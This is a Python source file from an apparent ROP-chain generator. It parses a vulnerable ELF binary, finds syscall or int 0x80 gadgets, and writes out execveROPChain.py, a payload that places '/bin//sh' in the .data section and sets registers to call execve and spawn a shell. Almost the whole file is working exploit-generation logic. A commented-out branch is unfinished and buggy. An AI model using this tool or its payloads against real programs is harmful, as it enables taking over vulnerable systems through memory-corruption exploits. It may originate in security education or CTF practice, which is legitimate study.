from elftools.elf.elffile import ELFFile
import capstone
import struct
import sys

import general
import print_pretty
import categorize
import get_gadgets
import chain


# Takes in 1-instruction GadgetList (general.ALLGADGETS) and name of the vulnerable executable
# This is the driver routine which will chain the rop-gadgets and get execve shellcode
def execveROPChain(GadgetList, vulnExecutable): 

    print("\n\n-->Chaining to get a shell using execve system call")

    fd = open(vulnExecutable, "rb")
    elffile = ELFFile(fd)
    data_section = ".data"
    section = elffile.get_section_by_name(data_section)
    
    # We need .data section's details because we have to write "/bin//sh" into it. 
    data_section_addr = section["sh_addr"]
    data_section_size = section["sh_size"]

    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    intList = categorize.checkIfIntPresent(GadgetList)

    if len(intList) == 0 and len(syscallList) == 0: 
        print("No int 0x80, no syscall, no ROP")
        print("Exiting tool :(")
        sys.exit()
    
    # There are 2 choices here: 
    
    # Choice - 1
    # if syscall is found, 
        # rax <- 59
        # rdi <- Address of "/bin/sh"
        # rsi <- 0
        # rdx <- 0
        # syscall
    if len(syscallList) > 0: 
        case2(GadgetList, data_section_addr)
        sys.exit()

    # Choice - 2
    # if int 0x80 is found, 
        # rax <- 11
        # rbx <- Address of "/bin/sh"
        # rcx <- 0
        # rdx <- 0
        # int 0x80
    elif len(intList) > 0: 
        case1(GadgetList, data_section_addr)
        sys.exit()

    print("--> No syscall / int 0x80 found => ROP Chaining failed")
    sys.exit()



# # If "int 0x80" is present
# def case1(GadgetList) : 

#     print("Entering case1")

#     fd = open("execveChain.py", "w")
#     writeHeader(fd)

#     raxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rax")
#     # print(raxList)
    

#     # rax <- 11
    
#     # Search for "pop rax; ret"
#     x = 0
#     while x < len(raxList) : 

#         gadget = raxList[x]
#         inst = gadget[0]

#         if inst['mnemonic'] == "pop" : 
                
#             # "pop rax; ret" found. 
#             # Steps to be taken: 
#                 # Put 11 in the payload
#                 # Execute "pop rax; ret"
               

#             # Write it into the file
#             fd.write("payload += struct.pack('<Q', 11)")
#             fd.write("\t\t# execve's system call number = 11")
#             fd.write("\n\t")
#             fd.write("payload += struct.pack('<Q', ")
#             fd.write(hex(int(inst['address'])))
#             fd.write(")")
#             fd.write("\t\t# Address of 'pop rax; ret'")
#             fd.write("\n\t")
#             break
        
#         x = x + 1
    
#     # Search for "xor rax, rax; ret"
#     x = 0
#     while x < len(raxList): 
  
#         if inst['mnemonic'] == "xor" : 

#             # "xor rax, rax; ret" found
#             # Jackpot!
#             # Steps to do: 
#                 # Execute "xor rax, rax; ret"
#                 # Find for arithmetic gadgets which will increase rax's value to 11


#             # Write it into the file
#             fd.write("payload += struct.pack('<Q', ")
#             fd.write(hex(int(inst['address'])))
#             fd.write(")")
#             fd.write("\t\t# Address of 'xor rax, rax; ret'")
#             fd.write("\n\t")

#             if changeRegValue(GadgetList, "rax", 0, 11, payload, fd) == 0: 
#                 print("Unable to find gadgets which can change rax's value")
#                 print("Exiting...")
#                 sys.exit()

#             break

#         # Keep the loop going!
#         x = x + 1

#     # TODO: Load "/bin//sh" into .data section
#     # TODO: Load address of .data into rbx

#     # # rcx <- 0
#     rcxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rcx")
#     print(rcxList)
#     rcxList = categorize.queryGadgets(GadgetList, general.MOVREGG, "rcx")
#     print(rcxList)
#     rcxList = categorize.queryGadgets(GadgetList, general.ARITHMETICLOADG, "rcx")
#     print(rcxList)
#     x = 0
#     while(x < len(rcxList)):
#         gadget = rcxList[x]
#         inst = gadget[0]
#         if inst['mnemonic'] == "pop" :
#             # "pop rcx; ret" found. 
#             # Steps to be taken: 
#                 # Put 0 in the payload
#                 # Execute "pop rax; ret"
                               

#             # Write it into the file
#             fd.write("payload += struct.pack('<Q', 0)")
#             fd.write("\n\t")
#             fd.write("payload += struct.pack('<Q', ")
#             fd.write(hex(int(inst['address'])))
#             fd.write(")")
#             fd.write("\n\t")
#             break
#         x = x + 1

#     # # rdx <- 0
#     # rdxList = categorize.queryGadgets(GadgetList, general.LOADCONSTG, "rdx")
#     # x = 0

#     # while(x < len(rdxList)):
#     #     gadget = rdxList[x]
#     #     inst = gadget[0]
#     #     if inst['mnemonic'] == "pop" :
#     #         # "pop rcx; ret" found. 
#     #         # Steps to be taken: 
#     #             # Put 0 in the payload
#     #             # Execute "pop rax; ret"
               
#     #         # Update payload
#     #         payload += struct.pack("<Q", 0)
#     #         payload += struct.pack("<Q", int(inst['address']))
                

#     #         # Write it into the file
#     #         fd.write("payload += struct.pack('<Q', 0)")
#     #         fd.write("\n\t")
#     #         fd.write("payload += struct.pack('<Q', ")
#     #         fd.write(hex(int(inst['address'])))
#     #         fd.write(")")
#     #         fd.write("\n\t")
#     #         break
#     #     x = x + 1


# If "syscall" instruction is found: 

# These are the steps to be followed. 
#
# 1. rax <- 59
# 2. Write "/bin//sh" into .data section
# 3. rdi <- .data section's address
# 4. rsi <- 0
# 5. rdx <- 0
# 6. Execute "syscall" instruction

def case2(GadgetList, data_section_addr) : 

    # Open the file where the payload is written in the form of a python script
    fd = open("execveROPChain.py", "w")
    chain.writeHeader(fd)
    
    # Step-2: Writing "/bin//sh" into .data section
    binsh = 0x68732f2f6e69622f
    binsh = struct.pack('<Q', binsh)
    chain.WriteStuffIntoMemory(binsh, data_section_addr, fd)
 
    # Step-1: rax <- 59
    chain.LoadConstIntoReg(GadgetList, "rax", 59, fd)

	# Step-3: rdi <- "Address of /bin//sh" - .data section's address
    chain.LoadConstIntoReg(GadgetList, "rdi", data_section_addr, fd)

	# Step-4: rsi <- 0
    chain.LoadConstIntoReg(GadgetList, "rsi", 0, fd)

    # Step-5: rdx <- 0
    chain.LoadConstIntoReg(GadgetList, "rdx", 0, fd)


    # Get syscall
    syscallList = categorize.checkIfSyscallPresent(GadgetList)
    syscallGadget = syscallList[0]
    
    syscallDict = syscallGadget[0]
    syscallAddress = syscallDict['address']
    
    fd.write("payload += struct.pack('<Q', ")
    fd.write(hex(int(syscallAddress)))
    fd.write(")")
    fd.write("\t\t# Address of syscall")
    fd.write("\n\t")

    
    chain.writeFooter(fd)
    print("-->Written the complete payload in execveROPChain.py")
    print("-->Chaining successful!")
